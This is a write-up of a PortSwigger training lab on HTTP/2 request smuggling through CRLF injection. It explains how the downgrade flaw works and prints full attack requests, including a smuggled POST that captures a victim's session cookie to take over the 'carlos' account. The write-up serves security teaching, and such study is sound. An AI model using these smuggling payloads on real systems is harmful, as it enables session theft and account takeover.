# HTTP/2 request smuggling via CRLF injection

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection), you'll learn: HTTP/2 request smuggling via CRLF injection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to [the documentation](https://portswigger.net/burp/documentation/desktop/http2) for details on how to use them.

> Note:
>  
> This lab supports HTTP/2 but doesn't advertise this via ALPN. To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
>  
> Please note that this feature is only available from [Burp Suite Professional / Community 2021.9.1](https://portswigger.net/burp/releases).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215141623.png)

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215141726.png)

In here, the web application has a login page. That being said, **if we can capture other user's requests, we could potentially takeover their account.**

To do so, we can try to do **HTTP request smuggling**.

**First, test the web application accept HTTP/2 (HTTP version 2) or not:**

> To send HTTP/2 requests using Burp Repeater, you need to enable the [Allow HTTP/2 ALPN override](https://portswigger.net/burp/documentation/desktop/http2#allow-http-2-alpn-override) option and manually [change the protocol to HTTP/2 using the Inspector](https://portswigger.net/burp/documentation/desktop/http2#changing-the-protocol-for-a-request).
> 
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215142016.png)
> 
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215142033.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215142050.png)

As you can see, it accepts HTTP/2.

Now, we can test the web application is vulnerable to **H2.CL (Front-end uses HTTP/2, back-end uses `Content-Length` header) via downgrading HTTP/2 requests.**

- H2.CL:

**Attack request:**
```http
POST / HTTP/2
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404pls HTTP/1.1
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Content-Length: 25

smuggled=yes
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215142532.png)

However, when we send the request, nothing happen.

We can also try **H2.TE (Front-end uses HTTP/2, back-end uses `Transfer-Encoding` header) via downgrading HTTP/2 requests.**

- H2.TE:

**Attack request:**
```http
POST / HTTP/2
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404pls HTTP/1.1
X:Foo: x
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144447.png)

Still nothing?

Maybe we can do **request smuggling via CRLF (Carriage Return `\r`, Line Feed `\n`) injection?**

Even if websites take steps to prevent basic H2.CL or H2.TE attacks, such as validating the `content-length` or stripping any `transfer-encoding` headers, HTTP/2's binary format enables some novel ways to bypass these kinds of front-end measures.

In HTTP/1, we can sometimes exploit discrepancies between how servers handle standalone newline (`\n`) characters to smuggle prohibited headers. If the back-end treats this as a delimiter, but the front-end server does not, some front-end servers will fail to detect the second header at all.

```http
Foo: bar\nTransfer-Encoding: chunked
```

This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.

On the other hand, as HTTP/2 messages are binary rather than text-based, the boundaries of each header are based on explicit, predetermined offsets rather than delimiter characters. This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split:

`foo` `bar\r\nTransfer-Encoding: chunked`

This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers:

```http
Foo: bar
Transfer-Encoding: chunked
```

Let's try to **inject `Transfer-Encoding` header via CRLF injection**!

**To do so, we need to use the Inspector to drill down into the header, add a new header, then press the `Shift + Return` keys in the value input box:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144531.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144559.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144618.png)

Then send the request twice:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144637.png)

Yes! We successfully triggered a 404 response! Which means **the web application is vulnerable to HTTP request smuggling via H2.TE and CRLF injection!**

But, how can we capture users' request in the login page??

**In the home page, we can search something:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144813.png)

Let's search for anything:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144830.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144839.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215144854.png)

When we clicked the "Search" button, **it'll send a POST request to `/`, with parameter `search`.**

***Most importantly, it's tied to our session!***

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215145004.png)

Armed with above information, we can capture other users' requests via **smuggling a POST request to `/` with a big `Content-Length` value.**

**Attack request:**
```http
POST / HTTP/2
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
foo: bar\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a5e001603e9ba1cc0630ad000180094.web-security-academy.net
Cookie: session=g5VS4PaNaMcMZ1uI02pCFquZaqDzxPW4; _lab_analytics=WKesnTTuo8aqDwQZi1tet4JIbNutweZ7odsZVzSSLjPiagwKcmsIKJMVDq0UPBXuGn04iuFmgisVdmi9vBegM8v0V072K5R4dZhnMwSyZFyJ2UKw5wgMVsMb4VAehnlg2thHlf4WqEXcOVZcmH0HkTilNqh4DLOwpikt9VGEAiRR4L24jChh4282BHUaiKZWY5pGPKXbyEJrPfHedNvv50yDmjm6pbAgZreZJCkCM7nB9IAddhomuaPrF8vY5E1o
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

search=
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215145829.png)

**Then, in the home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215145848.png)

We captured the victim's session cookie!!

**Finally, modify our session cookie to the victim one:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-13/images/Pasted%20image%2020230215150026.png)

Boom! We takeovered `carlos` account!

# What we've learned:

1. HTTP/2 request smuggling via CRLF injection